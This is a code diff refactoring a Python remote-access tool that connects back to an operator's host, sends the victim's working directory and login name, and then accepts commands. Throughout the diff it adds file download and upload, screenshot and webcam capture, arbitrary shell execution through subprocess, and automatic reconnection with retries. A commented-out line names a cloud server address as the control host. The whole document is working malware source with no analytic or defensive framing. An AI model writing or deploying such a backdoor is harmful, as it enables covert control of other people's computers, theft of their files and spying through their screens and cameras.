@@ -2,6 +2,7 @@ import socket
 import os
 import pyautogui
 import re
+import time
 import subprocess
 import cv2
 
@@ -40,20 +41,26 @@ def get(s, filename):
         f.write(bits)
     f.close()
 
-def main():
+def socketCreation():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    port = 1234
+    #print("Socket Created!")
+    return s
+
+def socketConnection(s, ip, port):
     try:
-        #s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
-        s.connect(('127.0.0.1',port))
-    except Exception as e:
-         main()
+        s.connect((ip,port))
+        #print("Connection Established!")
+    except:
+        #print("Trying Again!")
+        socketConnection(s, ip, port)
+
+def cmd(s):
     s.send(os.getcwd().encode())
     s.send(os.getlogin().encode())
     while True:
-        res = s.recv(2048).decode()
-        res = res.lower()
-        temp = res.split(" ")
+        cmd = s.recv(2048).decode()
+        cmd = cmd.lower()
+        temp = cmd.split(" ")
         if temp[0] == 'cd':
             if temp[1] == '..':
                 cwd = os.getcwd()
@@ -65,33 +72,47 @@ def main():
                 s.send((os.getcwd() + ">").encode())
                 s.send("Directory Changed...".encode())
             else:
-                res = re.findall("cd (.+)", res)
-                os.chdir(res[0])
+                cmd = re.findall("cd (.+)", cmd)
+                os.chdir(cmd[0])
                 s.send((os.getcwd() + ">").encode())
                 s.send("Directory Changed...".encode())
-            elif res == "exit":
-                break
-            elif 'get*' in res or 'cat*' in res:
-                transfer(s, res.split("*")[1])
+        elif cmd == "exit":
+            break
+        elif 'get*' in cmd or 'cat*' in cmd:
+            transfer(s, cmd.split("*")[1])
+            continue
+        elif 'upload*' in cmd:
+            get(s, cmd.split("*")[2])
+            continue
+        elif cmd == 'ss':
+            screenshots(s)
+            continue
+        elif cmd == "webcam":
+            webcam(s)
+            continue
+        else:
+            s.send((os.getcwd() + ">").encode())
+            cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            t = cmd.stdout.read().decode()
+            if t == "":
+                s.send("Command Executed....".encode())
                 continue
-            elif 'upload*' in res:
-                get(s, res.split("*")[2])
-                continue
-            elif res == 'ss':
-                screenshots(s)
-                continue
-            elif res == "webcam":
-                webcam(s)
-                continue
-            else:
-                s.send((os.getcwd() + ">").encode())
-                res = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                t = res.stdout.read().decode()
-                if t == "":
-                    s.send("Command Executed....".encode())
-                    continue
-                s.send(t.encode())
+            s.send(t.encode())
     s.close()
+
+def main():
+    ip = '127.0.0.1'
+    port = 1234
+    s = socketCreation()
+    socketConnection(s, ip, port)
+    try:
+        cmd(s)
+    except:
+        time.sleep(1)
+        main()
+    time.sleep(1)
+    main()
+
 
 if __name__ == '__main__':
     main()
